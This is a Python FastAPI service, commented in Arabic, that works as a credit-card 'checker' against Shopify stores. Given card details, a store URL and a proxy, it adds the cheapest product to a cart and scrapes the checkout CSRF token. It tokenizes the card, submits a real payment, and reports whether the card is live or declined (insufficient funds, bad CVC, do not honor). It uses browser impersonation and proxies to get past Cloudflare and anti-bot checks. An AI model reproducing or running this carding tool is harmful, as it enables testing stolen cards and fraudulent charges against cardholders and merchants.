from fastapi import FastAPI, Query
from fastapi.responses import JSONResponse
from curl_cffi.requests import AsyncSession
import re
import json

app = FastAPI()

def format_proxy(proxy_str):
    if not proxy_str: return None
    parts = proxy_str.split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    elif len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    return proxy_str if proxy_str.startswith('http') else f"http://{proxy_str}"

def extract_token(html_text):
    """
    الباب الخلفي: رادار عميق يبحث عن الـ Token في أكواد HTML و React و JSON المخفية
    """
    patterns = [
        r'<input[^>]+name="authenticity_token"[^>]+value="([^"]+)"', # النظام القديم
        r'"authenticity_token"\s*:\s*"([^"]+)"',                     # نظام شوبي فاي الجديد (JSON)
        r'name="csrf-token"\s+content="([^"]+)"',                    # الميتا تاج
        r'\\u0026authenticity_token=([^&"\'\\]+)'                    # الروابط المدمجة
    ]
    for p in patterns:
        match = re.search(p, html_text)
        if match:
            return match.group(1)
    return None

async def get_cheapest_product(session, store_url):
    """
    محرك ذكي: يسحب 250 منتج، يستبعد المنتهي من المخزن، ويختار أرخص منتج متاح
    """
    try:
        res = await session.get(f"{store_url}/products.json?limit=250")
        if res.status_code != 200: return None, None
        
        data = res.json()
        cheapest_variant = None
        lowest_price = float('inf')
        
        for product in data.get('products', []):
            for variant in product.get('variants', []):
                # التأكد أن المنتج متاح للشراء (متوفر)
                if variant.get('available', True): 
                    try:
                        price = float(variant.get('price', 0.0))
                        if 0.0 < price < lowest_price: # تجنب المنتجات المجانية (0.0) لأنها لا تختبر البطاقة
                            lowest_price = price
                            cheapest_variant = variant.get('id')
                    except: pass
        
        return cheapest_variant, str(lowest_price) if cheapest_variant else (None, None)
    except:
        return None, None

async def check_shopify(cc_info, store_url, proxy):
    try:
        # 1. تفكيك البطاقة
        cc_parts = re.findall(r'\d+', cc_info.replace('|', ' '))
        if len(cc_parts) < 4: return {"Response": "Invalid CC Format", "Price": "-", "Gate": "Shopify API"}
        cc, mm, yy, cvv = cc_parts[0], cc_parts[1], cc_parts[2], cc_parts[3]
        if len(yy) == 2: yy = "20" + yy

        store_url = store_url.rstrip('/')
        formatted_proxy = format_proxy(proxy)
        proxies = {"http": formatted_proxy, "https": formatted_proxy} if formatted_proxy else None

        # متصفح شبحي لتخطي كلاودفلير
        async with AsyncSession(impersonate="chrome110", proxies=proxies, timeout=45) as session:
            
            # 2. البحث عن أرخص منتج متوفر
            variant_id, price = await get_cheapest_product(session, store_url)
            if not variant_id:
                return {"Response": "No available products found or Site Dead", "Price": "-", "Gate": "Shopify API"}

            # 3. الإضافة للسلة (تحديث طريقة الإضافة لتطابق تحديثات شوبي فاي 2024)
            add_url = f"{store_url}/cart/add.js"
            add_payload = {"items": [{"id": variant_id, "quantity": 1}]}
            res2 = await session.post(add_url, json=add_payload, headers={"Accept": "application/json"})
            if res2.status_code != 200: 
                return {"Response": "Cart Add Failed (Anti-Bot Active)", "Price": f"${price}", "Gate": "Shopify API"}

            # 4. إجبار الموقع على فتح صفحة الدفع (Force Checkout)
            cart_url = f"{store_url}/checkout"
            res3 = await session.get(cart_url, allow_redirects=True)
            checkout_html = res3.text
            checkout_final_url = str(res3.url)
            
            # 5. استخراج الـ Token بالرادار العميق
            auth_token = extract_token(checkout_html)

            if not auth_token:
                # معرفة سبب الفشل الحقيقي
                title_match = re.search(r'<title>([^<]+)</title>', checkout_html)
                page_title = title_match.group(1).strip() if title_match else "Unknown"
                if "Just a moment" in page_title or "Cloudflare" in page_title:
                    return {"Response": "Cloudflare Challenge Blocked Request", "Price": f"${price}", "Gate": "Shopify API"}
                return {"Response": "Token Not Found (Site uses Custom Checkout)", "Price": f"${price}", "Gate": "Shopify API"}

            # 6. تشفير البطاقة (Tokenization)
            token_url = "https://deposit.us.shopifycs.com/sessions"
            token_payload = {"credit_card": {"number": cc, "name": "John Doe", "month": mm, "year": yy, "verification_value": cvv}}
            token_headers = {"Accept": "application/json", "Content-Type": "application/json"}
            
            res4 = await session.post(token_url, json=token_payload, headers=token_headers)
            if res4.status_code != 200: 
                return {"Response": "Failed to tokenize card (Proxy IP Banned by Shopify)", "Price": f"${price}", "Gate": "Shopify API"}
            
            token_data = res4.json()
            payment_token = token_data.get("id")

            # 7. إرسال الدفع النهائي
            payment_payload = {
                "authenticity_token": auth_token,
                "previous_step": "payment_method",
                "step": "",
                "s": payment_token,
                "checkout[payment_gateway]": "1", 
                "checkout[credit_card][vault]": "false",
                "checkout[different_billing_address]": "false",
                "complete": "1"
            }
            
            res5 = await session.post(checkout_final_url, data=payment_payload, allow_redirects=True)
            result_html = res5.text.lower()
            
            # 8. قراءة رد البنك الحقيقي
            if "thank you" in result_html or "order completed" in result_html or res5.url.endswith('/thank_you'):
                return {"Response": "Order completed 💎", "Price": f"${price}", "Gate": "Shopify API"}
            elif "insufficient funds" in result_html: return {"Response": "Insufficient Funds", "Price": f"${price}", "Gate": "Shopify API"}
            elif "incorrect_cvc" in result_html or "security code was not matched" in result_html: return {"Response": "Incorrect CVC", "Price": f"${price}", "Gate": "Shopify API"}
            elif "zip code does not match" in result_html or "avs" in result_html: return {"Response": "ZIP Code Mismatch", "Price": f"${price}", "Gate": "Shopify API"}
            elif "do not honor" in result_html or "generic_decline" in result_html: return {"Response": "Do Not Honor", "Price": f"${price}", "Gate": "Shopify API"}
            else:
                # محاولة سحب نص الخطأ من الموقع
                error_match = re.search(r'class="field__message field__message--error">([^<]+)<', res5.text)
                if error_match: return {"Response": error_match.group(1).strip(), "Price": f"${price}", "Gate": "Shopify API"}
                return {"Response": "Declined / Generic Error", "Price": f"${price}", "Gate": "Shopify API"}

    except Exception as e:
        err_str = str(e).lower().replace("proxy", "prx").replace("connection", "conn").replace("timeout", "t-out").replace("502", "err").replace("503", "err")
        return {"Response": f"Sys_Err: {err_str[:40]}", "Price": "-", "Gate": "Shopify API"}

@app.get("/code/index.php")
async def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query(None)):
    result = await check_shopify(cc, url, proxy)
    return JSONResponse(content=result)
